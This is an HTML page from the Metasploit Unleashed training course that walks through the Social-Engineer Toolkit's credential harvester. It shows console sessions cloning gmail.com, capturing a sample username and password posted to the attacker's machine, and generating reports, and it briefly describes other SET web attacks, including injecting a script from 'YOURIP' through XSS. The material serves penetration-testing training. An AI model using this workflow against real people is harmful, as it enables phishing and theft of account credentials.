<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Credential Harvester Attack Method</title>
</head>
<body>
<h1 id="firstHeading" class="firstHeading">Credential Harvester Attack
Method</h1>
<h3 id="siteSub">From Metasploit Unleashed - Mastering The Framework</h3>
<p>The credential harvester attack method is used when you don&#8217;t want
to specifically get a shell but perform phishing attacks in order to
obtain username and passwords from the system. In this attack vector, a
website will be cloned, and when the victim enters in their user
credentials, the usernames and passwords will be posted back to your
machine and the victim will be redirected back to the legitimate site. <br>
<br>
</p>
<pre>1. The Java Applet Attack Method<br>2. The Metasploit Browser Exploit Method<br>3. Credential Harvester Attack Method<br>4. Tabnabbing Attack Method<br>5. Man Left in the Middle Attack Method<br>6. Web Jacking Attack Method<br>7. Multi-Attack Web Method<br>8. Return to the previous menu<br><br>Enter your choice (press enter for default): <span
 style="color: rgb(51, 153, 102);">3</span><br><br><br>The first method will allow SET to import a list of pre-defined<br>web applications that it can utilize within the attack.<br><br>The second method will completely clone a website of your choosing<br>and allow you to utilize the attack vectors within the completely<br>same web application you were attempting to clone.<br><br>The third method allows you to import your own website, note that you<br>should only have an index.html when using the import website<br>functionality.<br><br>[!] Website Attack Vectors [!]<br><br>1. Web Templates<br>2. Site Cloner<br>3. Custom Import<br>4. Return to main menu<br><br>Enter number (1-4): <span
 style="color: rgb(51, 153, 102);">2</span><br><br>Email harvester will allow you to utilize the clone capabilities within SET<br>to harvest credentials or parameters from a website as well as place them into a report.<br><br><br>SET supports both HTTP and HTTPS<br>Example: http://www.thisisafakesite.com<br>Enter the url to clone: <span
 style="color: rgb(51, 153, 102);">https://gmail.com</span><br><br><span
 style="color: rgb(51, 51, 153);">[*]</span> Cloning the website: https://gmail.com<br><span
 style="color: rgb(51, 51, 153);">[*]</span> This could take a little bit...<br><br>The best way to use this attack is if username and password form<br>fields are available. Regardless, this captures all POSTs on a website.<br><span
 style="color: rgb(51, 51, 153);">[*]</span> I have read the above message. <span
 style="color: rgb(51, 51, 153);">[*]</span><br><br>Press {return} to continue.<br><span
 style="color: rgb(51, 51, 153);">[*]</span> Social-Engineer Toolkit Credential Harvester Attack<br><span
 style="color: rgb(51, 51, 153);">[*]</span> Credential Harvester is running on port 80<br><span
 style="color: rgb(51, 51, 153);">[*]</span> Information will be displayed to you as it arrives below:</pre>
<br>
Once the victim clicks the link, they will be presented with an exact
replica of gmail.com and hopefully be enticed to enter their username
and password into the form fields.
<br>
<br>
<div class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:SET_03.png"
 class="image"><img alt="SET 03.png"
 src="http://www.offensive-security.com/w/images/0/0c/SET_03.png"
 width="1414" height="566"></a></div>
</div>
<p><br>
<br>
As soon as the victim hits sign in, we are presented with the
credentials and the victim is redirected back to the legitimate site.
<br>
<br>
</p>
<pre><span style="color: rgb(51, 51, 153);">[*]</span> Social-Engineer Toolkit Credential Harvester Attack<br><span
 style="color: rgb(51, 51, 153);">[*]</span> Credential Harvester is running on port 80<br><span
 style="color: rgb(51, 51, 153);">[*]</span> Information will be displayed to you as it arrives below:<br>172.16.32.131 - - [09/Sep/2010 10:12:55] "GET / HTTP/1.1" 200 -<br><span
 style="color: rgb(51, 51, 153);">[*]</span> WE GOT A HIT! Printing the output:<br>PARAM: ltmpl=default<br>PARAM: ltmplcache=2<br>PARAM: continue=https://mail.google.com/mail/?<br>PARAM: service=mail<br>PARAM: rm=false<br>PARAM: dsh=-7536764660264620804<br>PARAM: ltmpl=default<br>PARAM: ltmpl=default<br>PARAM: scc=1<br>PARAM: ss=1<br>PARAM: timeStmp=<br>PARAM: secTok=<br>PARAM: GALX=nwAWNiTEqGc<br>POSSIBLE USERNAME FIELD FOUND: Email=thisismyuser<br>POSSIBLE PASSWORD FIELD FOUND: Passwd=thisismypassword<br>PARAM: rmShown=1<br>PARAM: signIn=Sign+in<br>PARAM: asts=<br>[*] WHEN YOUR FINISHED. HIT CONTROL-C TO GENERATE A REPORT</pre>
<br>
Also note that when you're finished, hit CONTROL-C, and a report
will be generated for you in two formats. The first is an html based
report, the other is xml should you need to parse the information in
another tool.
<br>
<br>
<pre><span style="color: rgb(51, 153, 102);">^C</span><span
 style="color: rgb(51, 51, 153);">[*]</span> File exported to reports/2010-09-09 10:14:30.152435.html for your reading pleasure...<br><span
 style="color: rgb(51, 51, 153);">[*]</span> File in XML format exported to reports/2010-09-09 10:14:30.152435.xml for your reading pleasure...<br><br>Press {return} to return to the menu.<span
 style="color: rgb(51, 153, 102);">^C</span><br>The Social-Engineer Toolkit "Web Attack" vector is a unique way of<br>utilizing multiple web-based attacks in order to compromise the<br>intended victim.<br><br>Enter what type of attack you would like to utilize.<br><br>The Java Applet attack will spoof a Java Certificate and<br>deliver a metasploit based payload. Uses a customized<br>java applet created by Thomas Werth to deliver<br>the payload.<br><br>The Metasploit browser exploit method will utilize select<br>Metasploit browser exploits through an iframe and deliver<br>a Metasploit payload.<br><br>The Credential Harvester Method will utilize web cloning<br>of a website that has a username and password field and<br>harvest all the information posted to the website.<br><br>The TabNabbing Method will wait for a user to move to a<br>different tab, then refresh the page to something different.<br><br>The Man Left in the Middle Attack Method was introduced by<br>Kos and utilizes HTTP REFERER's in order to intercept fields<br>and harvest data from them. You need to have an already vulnerable<br>site and incorporate script src="http://YOURIP/". This could either<br>be from a compromised site or through XSS.<br><br>The web jacking attack method was introduced by white_sheep, Emgent<br>and the Back|Track team. This method utilizes iframe replacements to<br>make the highlighted URL link to appear legitimate however when clicked<br>a window pops up then is replaced with the malicious link. You can edit<br>the link replacement settings in the set_config if its to slow/fast.<br><br>The multi-attack will add a combination of attacks through the web attack<br>menu. For example you can utilize the Java Applet, Metasploit Browser,<br>Credential Harvester/Tabnabbing, and the Man Left in the Middle attack<br>all at once to see which is successful.<br><br>1. The Java Applet Attack Method<br>2. The Metasploit Browser Exploit Method<br>3. Credential Harvester Attack Method<br>4. Tabnabbing Attack Method<br>5. Man Left in the Middle Attack Method<br>6. Web Jacking Attack Method<br>7. Multi-Attack Web Method<br>8. Return to the previous menu<br><br>Enter your choice (press enter for default): <span
 style="color: rgb(51, 153, 102);">^C</span><br><br>Thank you for shopping at the Social-Engineer Toolkit.<br><br>Hack the Gibson...<br><br>root@bt:/pentest/exploits/set# <span
 style="color: rgb(51, 153, 102);">firefox reports/2010-09-09\ 10\:14\:30.152435.</span><br>2010-09-09 10:14:30.152435.html  2010-09-09 10:14:30.152435.xml<br>root@bt:/pentest/exploits/set# <span
 style="color: rgb(51, 153, 102);">firefox reports/2010-09-09\ 10\:14\:30.152435.html</span></pre>
<br>
<br>
<div class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:SET_04.png"
 class="image"><img alt="SET 04.png"
 src="http://www.offensive-security.com/w/images/6/6d/SET_04.png"
 width="1421" height="720"></a></div>
</div>
<p><br>
</p>
<div style="text-align: center;"><a
 href="http://www.offensive-security.com/metasploit-unleashed/SET"
 title="SET">SET</a></div>
</body>
</html>
